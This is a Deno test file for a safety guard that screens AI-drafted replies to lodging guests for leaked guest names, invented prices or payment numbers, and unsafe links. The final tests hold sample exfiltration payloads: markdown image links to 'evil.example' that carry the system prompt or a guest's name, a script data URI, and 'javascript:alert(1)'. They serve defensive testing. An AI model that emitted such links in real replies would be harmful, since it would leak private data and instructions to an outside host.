import { assert, assertEquals } from 'https://deno.land/std@0.208.0/assert/mod.ts';

import {
  AI_SUGGEST_FALLBACK_REPLY,
  assertSafeGuestReply,
  classifyGuestInquiryIntent,
  findUnsafeReplyLink,
} from './inboxAiSafetyGuard.ts';

Deno.test('classifyGuestInquiryIntent - sensitive guest list request', () => {
  assertEquals(
    classifyGuestInquiryIntent('Who else is staying at the property this week?'),
    'sensitive'
  );
});

Deno.test('classifyGuestInquiryIntent - normal pricing question', () => {
  assertEquals(classifyGuestInquiryIntent('What is the rate for tonight?'), 'normal');
});

Deno.test('assertSafeGuestReply - blocks other guest names', () => {
  const result = assertSafeGuestReply({
    draftText: 'James Lim is also checked in on your dates.',
    guestMessage: 'Is parking included?',
    allowedFacts: { pricingValues: [] },
    participantName: 'Maria Santos',
    otherGuestNames: ['James Lim'],
  });
  assertEquals(result.safe, false);
  if (!result.safe) {
    assert(result.reason.includes('James Lim'));
  }
});

Deno.test(
  'assertSafeGuestReply - a guest surname that is also a word fragment does not false-flag ' +
    '(reproduced live: "King" matched inside "parking")',
  () => {
    const result = assertSafeGuestReply({
      draftText: 'Yes, parking is available on-site for 400 pesos. Check-in time is at 2:00 PM.',
      guestMessage: 'Is there parking on site, and what time is check-in?',
      allowedFacts: { pricingValues: [400] },
      participantName: 'Scenario Guest',
      otherGuestNames: ['King'],
    });
    assertEquals(result.safe, true);
  }
);

Deno.test(
  'assertSafeGuestReply - a number-word name token never flags an ordinary count/time reply ' +
    '(reproduced live: "One" / "Two" name tokens from the seeded guest list)',
  () => {
    const result = assertSafeGuestReply({
      draftText: 'You can book one more night, and check-out is at two in the afternoon.',
      guestMessage: 'Can I extend my stay?',
      allowedFacts: { pricingValues: [] },
      participantName: null,
      otherGuestNames: ['One', 'Two'],
    });
    assertEquals(result.safe, true);
  }
);

Deno.test(
  'assertSafeGuestReply - a surname that is a whole word elsewhere in the draft still blocks',
  () => {
    const result = assertSafeGuestReply({
      draftText: 'King is also staying this week in the room next door.',
      guestMessage: 'Who else is here?',
      allowedFacts: { pricingValues: [] },
      participantName: null,
      otherGuestNames: ['King'],
    });
    assertEquals(result.safe, false);
  }
);

Deno.test('assertSafeGuestReply - allows grounded pricing amount', () => {
  const result = assertSafeGuestReply({
    draftText: 'The nightly rate is ₱3,500.',
    guestMessage: 'How much per night?',
    allowedFacts: { pricingValues: [3500] },
  });
  assertEquals(result.safe, true);
});

Deno.test('assertSafeGuestReply - blocks ungrounded pricing', () => {
  const result = assertSafeGuestReply({
    draftText: 'The nightly rate is ₱9,999.',
    guestMessage: 'How much per night?',
    allowedFacts: { pricingValues: [3500] },
  });
  assertEquals(result.safe, false);
});

Deno.test('assertSafeGuestReply - sensitive inquiry with refusal is safe', () => {
  const result = assertSafeGuestReply({
    draftText: "I can't share other guest details for privacy. I'll check with the host team.",
    guestMessage: 'Who else booked this weekend?',
    allowedFacts: { pricingValues: [] },
  });
  assertEquals(result.safe, true);
});

Deno.test('AI_SUGGEST_FALLBACK_REPLY is non-empty', () => {
  assert(AI_SUGGEST_FALLBACK_REPLY.trim().length > 0);
});

Deno.test('assertSafeGuestReply - blocks an invented GCash / bank number', () => {
  const result = assertSafeGuestReply({
    draftText: 'Please send the down payment to GCash 0917 123 4567.',
    guestMessage: 'How do I pay?',
    allowedFacts: { pricingValues: [], allowedAccountNumbers: ['09998887777'] },
  });
  assertEquals(result.safe, false);
});

Deno.test('assertSafeGuestReply - allows the configured payment account number', () => {
  const result = assertSafeGuestReply({
    draftText: 'You can pay via GCash 0999-888-7777 (Juan D.).',
    guestMessage: 'How do I pay?',
    allowedFacts: { pricingValues: [], allowedAccountNumbers: ['09998887777'] },
  });
  assertEquals(result.safe, true);
});

Deno.test(
  'assertSafeGuestReply - allows numbers present in the grounded facts (host phone)',
  () => {
    const result = assertSafeGuestReply({
      draftText: 'You can reach the host at +63 917 555 0101.',
      guestMessage: 'What is your number?',
      allowedFacts: { pricingValues: [], factsText: 'Host contact: +63 917 555 0101' },
    });
    assertEquals(result.safe, true);
  }
);

Deno.test('assertSafeGuestReply - checks amounts written without a currency sign', () => {
  const ungrounded = assertSafeGuestReply({
    draftText: 'The rate is 9,999 per night.',
    guestMessage: 'What is the rate?',
    allowedFacts: { pricingValues: [3500] },
  });
  assertEquals(ungrounded.safe, false);
  const grounded = assertSafeGuestReply({
    draftText: 'The rate is 3,500 pesos per night.',
    guestMessage: 'What is the rate?',
    allowedFacts: { pricingValues: [3500] },
  });
  assertEquals(grounded.safe, true);
});

Deno.test('guard blocks a formatted account number the model grouped differently', () => {
  for (const formatted of ['0917.555.1234', '(0917) 555-1234', '+63 917 555 1234']) {
    const result = assertSafeGuestReply({
      draftText: `Please send it to ${formatted}.`,
      guestMessage: 'Where do I pay?',
      allowedFacts: {
        pricingValues: [],
        // A different, configured account: the formatted one is stray.
        allowedAccountNumbers: ['09998887777'],
        factsText: 'GCash 0999 888 7777',
      },
    });
    assertEquals(result.safe, false, formatted);
  }
});

Deno.test('a refusal phrase does not whitelist a finance figure after it', () => {
  for (const draftText of [
    "I can't share that, but our revenue was PHP 1,000,000 this month.",
    'I cannot share that. The profit margin is 30%.',
    "I'll check with the host. Our earnings were 250,000 last month.",
  ]) {
    const result = assertSafeGuestReply({
      draftText,
      guestMessage: 'What is your revenue?',
      allowedFacts: { pricingValues: [] },
    });
    assertEquals(result.safe, false, draftText);
  }
});

Deno.test('a refusal with no figure stays safe', () => {
  const result = assertSafeGuestReply({
    draftText: "I can't share revenue details. Please ask the host team.",
    guestMessage: 'What is your revenue?',
    allowedFacts: { pricingValues: [] },
  });
  assertEquals(result.safe, true);
});

Deno.test('findUnsafeReplyLink allows the platform and map links', () => {
  assertEquals(findUnsafeReplyLink('See https://kamespace.com/stay/abc for your guide.'), null);
  assertEquals(findUnsafeReplyLink('Directions: https://maps.app.goo.gl/xyz'), null);
  assertEquals(findUnsafeReplyLink('Use www.kamespace.com/help'), null);
});

Deno.test('findUnsafeReplyLink blocks an external link and a data URI', () => {
  assertEquals(
    findUnsafeReplyLink('![status](https://evil.example/collect?d=secret)'),
    'https://evil.example/collect?d=secret'
  );
  assertEquals(
    findUnsafeReplyLink('Click [here](https://evil.example/x) now'),
    'https://evil.example/x'
  );
  assertEquals(
    findUnsafeReplyLink('![x](data:text/html;base64,PHNjcmlwdD4=)'),
    'script or data URI'
  );
  assertEquals(findUnsafeReplyLink('javascript:alert(1)'), 'script or data URI');
});

Deno.test('assertSafeGuestReply blocks exfiltration through a rendered link', () => {
  for (const draftText of [
    '![status](https://evil.example/c?d=SYSTEM_PROMPT)',
    'Full details: https://evil.example/?guest=Carla%20Mendoza',
    '![x](data:text/html;base64,PHNjcmlwdD4=)',
  ]) {
    const result = assertSafeGuestReply({
      draftText,
      guestMessage: 'What is the wifi?',
      allowedFacts: { pricingValues: [] },
    });
    assertEquals(result.safe, false, draftText);
  }
});
